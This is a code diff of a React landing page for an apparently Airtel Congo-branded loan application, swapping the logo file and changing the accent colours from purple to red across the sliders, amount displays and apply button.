@@ -21,7 +21,7 @@ function LandingPage({ onApply }: LandingPageProps) {
     return (
         <div style={pageStyle}>
             <div style={headerStyle}>
-                <img src="/Airtel Congo.png" alt="Airtel Congo" style={logoStyle} />
+                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
                 <button
                     style={menuButtonStyle}
                     onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
@@ -91,7 +91,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                                     Loan Amount
                                 </span>
                                 <span
-                                    style={{ fontSize: "18px", fontWeight: "700", color: "#667eea" }}
+                                    style={{ fontSize: "18px", fontWeight: "700", color: "#e40000" }}
                                 >
                                     ${loanAmount.toLocaleString()}
                                 </span>
@@ -107,7 +107,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                                     width: "100%",
                                     height: "8px",
                                     cursor: "pointer",
-                                    accentColor: "#667eea",
+                                    accentColor: "#e40000",
                                 }}
                             />
                             <div
@@ -139,7 +139,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                                     Loan Term
                                 </span>
                                 <span
-                                    style={{ fontSize: "18px", fontWeight: "700", color: "#667eea" }}
+                                    style={{ fontSize: "18px", fontWeight: "700", color: "#e40000" }}
                                 >
                                     {loanTerm} months
                                 </span>
@@ -155,7 +155,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                                     width: "100%",
                                     height: "8px",
                                     cursor: "pointer",
-                                    accentColor: "#667eea",
+                                    accentColor: "#e40000",
                                 }}
                             />
                             <div
@@ -190,7 +190,7 @@ function LandingPage({ onApply }: LandingPageProps) {
                                 Monthly Payment
                             </span>
                             <span
-                                style={{ fontSize: "28px", fontWeight: "700", color: "#667eea" }}
+                                style={{ fontSize: "28px", fontWeight: "700", color: "#e40000" }}
                             >
                                 ${monthlyPayment.toFixed(2)}
                             </span>
@@ -203,12 +203,12 @@ function LandingPage({ onApply }: LandingPageProps) {
                         onMouseOver={(e) => {
                             e.currentTarget.style.transform = "translateY(-2px)";
                             e.currentTarget.style.boxShadow =
-                                "0 6px 20px rgba(102, 126, 234, 0.4)";
+                                "0 6px 20px rgba(228, 0, 0, 0.4)";
                         }}
                         onMouseOut={(e) => {
                             e.currentTarget.style.transform = "translateY(0)";
                             e.currentTarget.style.boxShadow =
-                                "0 4px 12px rgba(102, 126, 234, 0.3)";
+                                "0 4px 12px rgba(228, 0, 0, 0.3)";
                         }}
                     >
                         APPLY NOW
